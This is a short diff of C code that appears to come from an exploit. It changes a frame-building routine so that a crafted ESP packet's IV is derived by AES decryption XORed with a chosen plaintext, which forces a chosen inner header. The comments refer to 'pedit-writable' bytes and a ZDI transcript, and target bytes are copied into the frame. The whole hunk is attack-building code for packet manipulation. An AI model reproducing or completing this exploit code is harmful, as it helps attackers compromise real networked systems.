@@ -1644,8 +1644,17 @@ static void compose_esp_frame(const uint8_t target8[TARGET_BYTES])
 	g_full[ETH_HDR + 18] = 0;   g_full[ETH_HDR + 19] = 1;
 	g_full[34] = 0x00; g_full[35] = 0x00; g_full[36] = 0x01; g_full[37] = 0x00;
 	g_full[38] = 0x00; g_full[39] = 0x00; g_full[40] = 0x00; g_full[41] = 0x01;
-	for (i = 0; i < BLK; i++)
-		g_full[42 + i] = (uint8_t)(0x40 + i);           /* IV */
+	/* IV enforces block 0's plaintext: P_0 = D(C_0) ^ IV  =>  IV = D(C_0) ^ P_0.
+	 * The IV is pedit-writable linear-prefix bytes; a fixed pattern IV would
+	 * leave P_0 (the inner UDP header) unenforced and the self-check would
+	 * fail at block 0. The derived-looking IV bytes in the ZDI transcript
+	 * match this construction. */
+	{
+		uint8_t dv0[BLK];
+		aes_dec_raw(C, dv0);
+		for (i = 0; i < BLK; i++)
+			g_full[42 + i] = (uint8_t)(dv0[i] ^ P[i]);
+	}
 	memcpy(g_full + CT0, C, ctlen);
 	memcpy(g_full + g_frag, target8, TARGET_BYTES);
 
